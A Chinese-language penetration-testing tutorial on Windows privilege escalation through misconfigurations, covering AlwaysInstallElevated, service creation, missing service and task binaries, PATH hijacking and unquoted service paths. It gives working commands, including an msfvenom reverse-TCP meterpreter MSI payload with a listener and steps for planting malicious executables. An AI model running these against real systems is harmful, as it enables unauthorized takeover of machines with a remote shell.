> AUTHOR:ILU  
> 知识星球: ILU的秃头路线

## windows配置错误导致的提权

##### 1\. AlwaysInstallElevated

注册表键AlwaysinstallElevated是一个策略设置项。windows允许低权限用户以system权限安装文件。如果启用此策略设置向，那么任何权限用户都能以NT
AUTHORITY\SYSTEM权限来安装恶意的MSI文件。

`注意`: 默认没有此注册表项可以自己添加，除了注册表主动添加也可以在组策略中配置打开此设置，但是win10默认没有组策略需要另外自行安装打开。

    
    
    # 查询配置是否开启
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysinstallElevated
    
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysinstallElevated
    
    # 打开配置
    ## 当前用户
    reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysinstallElevated /t REG_DWORD /d 1
    ## 本地机器
    reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v
    AlwaysinstallElevated /t REG_DWORD /d 1
    
    # 关闭配置
    reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysinstallElevated /t REG_DWORD /d 0
    reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v
    AlwaysinstallElevated /t REG_DWORD /d 0
    

###### 开启注册表项后利用

这里简单使用msf生成msi程序，挺简单的，就给个指令就好了。只要开启此项就可以低权限用户用高权限安装恶意msi。

    
    
    # 生成msi文件
    msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=4444 -f msi -o shell.msi
    
    # 监听
    # msfconsole
    msf6 > handler -H x.x.x.x -P 4444 -p windows/meterpreter/reverse_tcp 
    msf6 > sessions  id ==> 监听到连接后用sessions查看会话并进入，h
    

##### 2\. 创建服务获取NT AUTHORITY\SYSTEM权限

这里假设已经是administrator权限，我们可以创建服务利用服务实现NT AUTHORITY\SYSTEM权限的获取。

    
    
    # 创建服务
    sc create 自定义服务名 binpath= "要执行的指令或者程序"
    # 查询服务配置
    sc qc 自定义服务名
    # 运行服务
    sc start 自定义服务名
    

![image-20220108173425406](https://image.3001.net/images/20220131/1643560189_61f6bcfd549c7124221e3.png!small)

##### 3\. 服务文件缺失

这部分导致的提权其实是因为有些服务原本的程序被删除了，
但是服务未被删除，所以我们可以自己生成一个和服务里的程序一模一样的名字做下替换，然后等待主机重启或者主动运行此服务获取SYSTEM权限。

###### 利用微软发布的工具查找缺失文件的服务

工具下载地址： https://docs.microsoft.com/zh-cn/sysinternals/downloads/autoruns

    
    
    autorunsc -a s | more
    	# 寻找File not found, 及对应服务文件缺失
    

![image-20220108211753704](https://image.3001.net/images/20220131/1643560190_61f6bcfe08c2f7bea13b4.png!small)

然后生成恶意文件与缺失文件名相同，并且放在服务指定的路径下。重新运行服务即可拿到权限。

##### 4\. 计划任务文件缺失

原理同上，找计划任务中缺失文件的计划任务替换然后运行计划任务。

    
    
    autorunsc64.exe -a t|more
    

##### 5\. 基于windows环境变量的劫持

这一部分就说个思路，就是查看windows的环境变量，可以通过查找`reg query
"HKLM\SYSTEM\CurrentControlSet\Control\Session
Manager\Environment"`这个注册表项观察全局变量（当前主机所有用户，只要登入都可以使用），
然后观察Path中的目录位置是否可写，可写则可以把恶意文件复制进此目录，直接调用，能够获取到用户相应的权限。

    
    
    # 查看
    reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
    # 查看目录权限
    icacls 目录路径
    	# 相关权限， 不懂就看帮助指令
    	M - 修改权限
    	I - 从父容器继承的权限
    	F - 完全访问权限
    # 复制文件到指定目录
    copy xxxx.exe 可修改的全局目录/notepad.exe
    # 一旦搞权限用户登入并使用notepad.exe，那么执行的就是我们的恶意程序
    

![image-20220108215958441](https://image.3001.net/images/20220131/1643560190_61f6bcfec2e3e79978518.png!small)

##### 6\. 未加引号的服务路径问题（不安全的服务）

导致这类问题的根本是在创建服务时，没有用引号把路径中带有空格的部分用引号引起来，导致了在调用的时候由于空格的原因被分为了两部分，就像参数一样。比如：
`c:\who ami\hhh`，实际上调用的是c:\who.exe `ami\hhh`。如果，who.exe不存在则会报没有这个程序或命令。

    
    
    # 查找
    wmic service get PathName,displayname, Name,startmode|findstr /i "auto"|findstr /i /v "c:\windows\\"|findstr /i /v """
    
    # 举例
    ## 未被引号引起来的服务路径
    服务名： test
    c:\program files\test
    ## 制作恶意文件
    copy program.exe c:\
    ## 运行服务，实际上因为路径问题最终调用program.exe
    sc start test
    

